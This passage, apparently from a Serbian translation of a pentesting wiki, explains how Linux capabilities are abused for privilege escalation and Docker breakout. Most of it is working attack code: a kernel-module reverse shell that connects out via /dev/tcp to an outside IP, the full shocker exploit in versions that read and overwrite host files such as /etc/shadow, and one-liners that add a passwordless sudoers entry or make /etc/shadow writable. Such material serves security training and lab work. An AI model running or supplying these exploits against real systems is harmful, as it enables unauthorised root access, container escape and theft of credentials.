5. **Инјектујте** га и добијте ваш **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** овлашћује процес да **учита и уклони модуле језгра (`init_module(2)`, `finit_module(2)` и `delete_module(2)` системски позиви)**, нудећи директан приступ основним операцијама језгра. Ова способност представља критичне безбедносне ризике, јер омогућава ескалацију привилегија и потпуну компромитацију система омогућавајући измене у језгру, чиме се заобилазе сви механизми безбедности у Линуксу, укључујући Линукс безбедносне модуле и изолацију контејнера.  
**Ово значи да можете** **убацити/уклонити модуле језгра у/из језгра хост машине.**

**Пример са бинарним**

У следећем примеру бинарни **`python`** има ову способност.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Podrazumevano, **`modprobe`** komanda proverava listu zavisnosti i map fajlove u direktorijumu **`/lib/modules/$(uname -r)`**.\
Da bismo to iskoristili, hajde da kreiramo lažni **lib/modules** folder:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Zatim **kompajlirajte kernel modul koji možete pronaći u 2 primera ispod i kopirajte** ga u ovu fasciklu:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Na kraju, izvršite potrebni python kod za učitavanje ovog kernel modula:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Primer 2 sa binarnim fajlom**

U sledećem primeru, binarni fajl **`kmod`** ima ovu sposobnost.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Što znači da je moguće koristiti komandu **`insmod`** za umetanje kernel modula. Pratite primer u nastavku da dobijete **reverse shell** zloupotrebljavajući ovu privilegiju.

**Primer sa okruženjem (Docker breakout)**

Možete proveriti omogućene sposobnosti unutar docker kontejnera koristeći:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Unutar prethodnog izlaza možete videti da je **SYS\_MODULE** sposobnost omogućena.

**Kreirajte** **kernel modul** koji će izvršiti reverznu ljusku i **Makefile** za **kompilaciju**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Prazan karakter pre svake reči make u Makefile-u **mora biti tab, a ne razmaci**!
{% endhint %}

Izvršite `make` da biste ga kompajlirali.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Na kraju, pokrenite `nc` unutar ljuske i **učitajte modul** iz druge i uhvatićete ljusku u nc procesu:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Kod ove tehnike je kopiran iz laboratorije "Zloupotreba SYS\_MODULE sposobnosti" sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Još jedan primer ove tehnike može se naći na [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesu da **zaobiđe dozvole za čitanje datoteka i za čitanje i izvršavanje direktorijuma**. Njegova primarna upotreba je za pretragu ili čitanje datoteka. Međutim, takođe omogućava procesu da koristi funkciju `open_by_handle_at(2)`, koja može pristupiti bilo kojoj datoteci, uključujući one van prostora imena montiranja procesa. Rukohvat korišćen u `open_by_handle_at(2)` treba da bude netransparentni identifikator dobijen putem `name_to_handle_at(2)`, ali može uključivati osetljive informacije poput inode brojeva koji su podložni manipulaciji. Potencijal za zloupotrebu ove sposobnosti, posebno u kontekstu Docker kontejnera, demonstrirao je Sebastian Krahmer sa shocker exploitom, kako je analizirano [ovde](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**To znači da možete** **zaobići provere dozvola za čitanje datoteka i provere dozvola za čitanje/izvršavanje direktorijuma.**

**Primer sa binarnim fajlom**

Binarni fajl će moći da čita bilo koju datoteku. Dakle, ako datoteka poput tar ima ovu sposobnost, moći će da pročita shadow datoteku:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Пример са binary2**

У овом случају претпоставимо да **`python`** бинарни фајл има ову способност. Да бисте набројали root фајлове, могли бисте да урадите:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
I da biste pročitali datoteku, mogli biste uraditi:
```python
print(open("/etc/shadow", "r").read())
```
**Пример у окружењу (Docker пробој)**

Можете проверити омогућене способности унутар docker контејнера користећи:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Unutar prethodnog izlaza možete videti da je **DAC\_READ\_SEARCH** sposobnost omogućena. Kao rezultat, kontejner može **debugovati procese**.

Možete saznati kako sledeće eksploatisanje funkcioniše na [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ali u sažetku **CAP\_DAC\_READ\_SEARCH** ne samo da nam omogućava da prolazimo kroz fajl sistem bez provere dozvola, već takođe eksplicitno uklanja sve provere za _**open\_by\_handle\_at(2)**_ i **može omogućiti našem procesu da pristupi osetljivim fajlovima koje su otvorili drugi procesi**.

Originalni eksploat koji koristi ove dozvole za čitanje fajlova sa hosta može se pronaći ovde: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), sledeća je **modifikovana verzija koja vam omogućava da navedete fajl koji želite da pročitate kao prvi argument i da ga dump-ujete u fajl.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Eksploit treba da pronađe pokazivač na nešto montirano na hostu. Originalni exploit je koristio datoteku /.dockerinit, a ova modifikovana verzija koristi /etc/hostname. Ako exploit ne radi, možda treba da postavite drugu datoteku. Da biste pronašli datoteku koja je montirana na hostu, jednostavno izvršite mount komandu:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Kod ove tehnike je kopiran iz laboratorije "Abusing DAC\_READ\_SEARCH Capability" sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Španiji** i jedna od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je vrelo okupljalište za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**To znači da možete zaobići provere dozvola za pisanje na bilo kojoj datoteci, tako da možete pisati u bilo koju datoteku.**

Postoji mnogo datoteka koje možete **prepisati da biste eskalirali privilegije,** [**možete dobiti ideje ovde**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Primer sa binarnim fajlom**

U ovom primeru vim ima ovu sposobnost, tako da možete modifikovati bilo koju datoteku kao što su _passwd_, _sudoers_ ili _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Primer sa binarnim 2**

U ovom primeru **`python`** binarni fajl će imati ovu sposobnost. Možete koristiti python da prepišete bilo koji fajl:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Primer sa okruženjem + CAP\_DAC\_READ\_SEARCH (Docker izlazak)**

Možete proveriti omogućene sposobnosti unutar docker kontejnera koristeći:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Prvo pročitajte prethodni odeljak koji [**zloupotrebljava DAC\_READ\_SEARCH sposobnost za čitanje proizvoljnih fajlova**](linux-capabilities.md#cap\_dac\_read\_search) hosta i **kompajlirajte** eksploataciju.\
Zatim, **kompajlirajte sledeću verziju shocker eksploatacije** koja će vam omogućiti da **pišete proizvoljne fajlove** unutar fajl sistema hosta:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Da biste pobegli iz docker kontejnera, možete **preuzeti** datoteke `/etc/shadow` i `/etc/passwd` sa hosta, **dodati** im **novog korisnika** i koristiti **`shocker_write`** da ih prepišete. Zatim, **pristupite** putem **ssh**.

**Kod ove tehnike je kopiran iz laboratorije "Abusing DAC\_OVERRIDE Capability" sa** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**To znači da je moguće promeniti vlasništvo nad bilo kojom datotekom.**

**Primer sa binarnim fajlom**

Pretpostavimo da **`python`** binarni fajl ima ovu sposobnost, možete **promeniti** **vlasnika** datoteke **shadow**, **promeniti root lozinku** i eskalirati privilegije:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ili sa **`ruby`** binarnim fajlom koji ima ovu sposobnost:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**To znači da je moguće promeniti dozvole bilo kog fajla.**

**Primer sa binarnim fajlom**

Ako python ima ovu sposobnost, možete modifikovati dozvole fajla shadow, **promeniti root lozinku**, i eskalirati privilegije:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**To znači da je moguće postaviti efektivni korisnički ID kreiranog procesa.**

**Primer sa binarnim fajlom**

Ako python ima ovu **kapacitet**, možete vrlo lako zloupotrebiti to da eskalirate privilegije na root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Još jedan način:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**To znači da je moguće postaviti efektivni grupni ID kreiranog procesa.**

Postoji mnogo fajlova koje možete **prepisati da biste eskalirali privilegije,** [**možete dobiti ideje odavde**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Primer sa binarnim fajlom**

U ovom slučaju trebate tražiti zanimljive fajlove koje grupa može da čita jer možete imitirati bilo koju grupu:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Kada pronađete datoteku koju možete zloupotrebiti (putem čitanja ili pisanja) da biste eskalirali privilegije, možete **dobiti shell imitujući interesantnu grupu** sa:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
U ovom slučaju, grupa shadow je imitirala, tako da možete pročitati datoteku `/etc/shadow`:
```bash
cat /etc/shadow
```
Ako je **docker** instaliran, možete **imitirati** **docker grupu** i zloupotrebiti je da komunicirate sa [**docker socketom** i eskalirate privilegije](./#writable-docker-socket).

## CAP\_SETFCAP

**To znači da je moguće postaviti sposobnosti na datoteke i procese**

**Primer sa binarnim fajlom**

Ako python ima ovu **sposobnost**, možete je vrlo lako zloupotrebiti da eskalirate privilegije na root: 

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Napomena da ako postavite novu sposobnost binarnom fajlu sa CAP\_SETFCAP, izgubićete ovu sposobnost.
{% endhint %}

Kada imate [SETUID sposobnost](linux-capabilities.md#cap\_setuid) možete otići u njen deo da vidite kako da eskalirate privilegije.

**Primer sa okruženjem (Docker breakout)**

Podrazumevano, sposobnost **CAP\_SETFCAP se dodeljuje procesu unutar kontejnera u Dockeru**. Možete to proveriti radeći nešto poput:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ova sposobnost omogućava da **damo bilo koju drugu sposobnost binarnim datotekama**, tako da možemo razmišljati o **izbegavanju** iz kontejnera **zloupotrebom bilo koje od drugih sposobnosti za izlazak** pomenutih na ovoj stranici.\
Međutim, ako pokušate da dodelite, na primer, sposobnosti CAP\_SYS\_ADMIN i CAP\_SYS\_PTRACE binarnoj datoteci gdb, otkrićete da ih možete dodeliti, ali **binarna datoteka neće moći da se izvrši nakon toga**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Dozvoljeno: Ovo je **ograničeni superset za efektivne sposobnosti** koje nit može preuzeti. Takođe je ograničeni superset za sposobnosti koje mogu biti dodate u nasledni skup od strane niti koja **nema CAP\_SETPCAP** sposobnost u svom efektivnom skupu._\
Izgleda da dozvoljene sposobnosti ograničavaju one koje se mogu koristiti.\
Međutim, Docker takođe po defaultu dodeljuje **CAP\_SETPCAP**, tako da možda možete **postaviti nove sposobnosti unutar naslednih**.\
Međutim, u dokumentaciji ove sposobnosti: _CAP\_SETPCAP : \[…] **dodajte bilo koju sposobnost iz ograničenog** skupa pozivajuće niti u njen nasledni skup_.\
Izgleda da možemo samo dodavati u nasledni skup sposobnosti iz ograničenog skupa. Što znači da **ne možemo staviti nove sposobnosti kao što su CAP\_SYS\_ADMIN ili CAP\_SYS\_PTRACE u nasledni skup za eskalaciju privilegija**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) pruža niz osetljivih operacija uključujući pristup `/dev/mem`, `/dev/kmem` ili `/proc/kcore`, modifikaciju `mmap_min_addr`, pristup `ioperm(2)` i `iopl(2)` sistemskim pozivima, i razne disk komande. `FIBMAP ioctl(2)` je takođe omogućen putem ove sposobnosti, što je uzrokovalo probleme u [prošlosti](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Prema man stranici, ovo takođe omogućava nosiocu da opisno `izvrši niz operacija specifičnih za uređaje na drugim uređajima`.

Ovo može biti korisno za **eskalaciju privilegija** i **Docker breakout.**

## CAP\_KILL

**To znači da je moguće ubiti bilo koji proces.**

**Primer sa binarnim fajlom**

Pretpostavimo da **`python`** binarni fajl ima ovu sposobnost. Ako biste mogli **takođe modifikovati neku konfiguraciju servisa ili soketa** (ili bilo koji konfiguracioni fajl vezan za servis), mogli biste ga unazaditi, a zatim ubiti proces vezan za taj servis i čekati da novi konfiguracioni fajl bude izvršen sa vašim unazadjenjem.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc sa kill**

Ako imate kill sposobnosti i postoji **node program koji se izvršava kao root** (ili kao drugi korisnik) mogli biste verovatno **poslati** mu **signal SIGUSR1** i naterati ga da **otvori node debager** na koji se možete povezati.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Španiji** i jedna od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je vrelo okupljanje za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**To znači da je moguće slušati na bilo kom portu (čak i na privilegovanim).** Ne možete direktno eskalirati privilegije sa ovom sposobnošću.

**Primer sa binarnim fajlom**

Ako **`python`** ima ovu sposobnost, moći će da sluša na bilo kom portu i čak se poveže sa njega na bilo koji drugi port (neke usluge zahtevaju veze sa specifičnih privilegovanih portova)

{% tabs %}
{% tab title="Listen" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Poveži" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) sposobnost omogućava procesima da **kreiraju RAW i PACKET sokete**, omogućavajući im da generišu i šalju proizvoljne mrežne pakete. To može dovesti do bezbednosnih rizika u kontejnerizovanim okruženjima, kao što su spoofing paketa, injekcija saobraćaja i zaobilaženje mrežnih kontrola pristupa. Zlonamerni akteri bi mogli iskoristiti ovo da ometaju rutiranje kontejnera ili ugroze bezbednost mreže domaćina, posebno bez adekvatne zaštite od vatrozida. Pored toga, **CAP_NET_RAW** je ključan za privilegovane kontejnere da podrže operacije poput pinga putem RAW ICMP zahteva.

**To znači da je moguće presresti saobraćaj.** Ne možete direktno eskalirati privilegije sa ovom sposobnošću.

**Primer sa binarnim fajlom**

Ako binarni fajl **`tcpdump`** ima ovu sposobnost, moći ćete da ga koristite za hvatanje mrežnih informacija.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Napomena da ako **okruženje** daje ovu sposobnost, možete takođe koristiti **`tcpdump`** za presretanje saobraćaja.

**Primer sa binarnim 2**

Sledeći primer je **`python2`** kod koji može biti koristan za presretanje saobraćaja sa "**lo**" (**localhost**) interfejsa. Kod je iz laboratorije "_Osnove: CAP-NET\_BIND + NET\_RAW_" sa [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

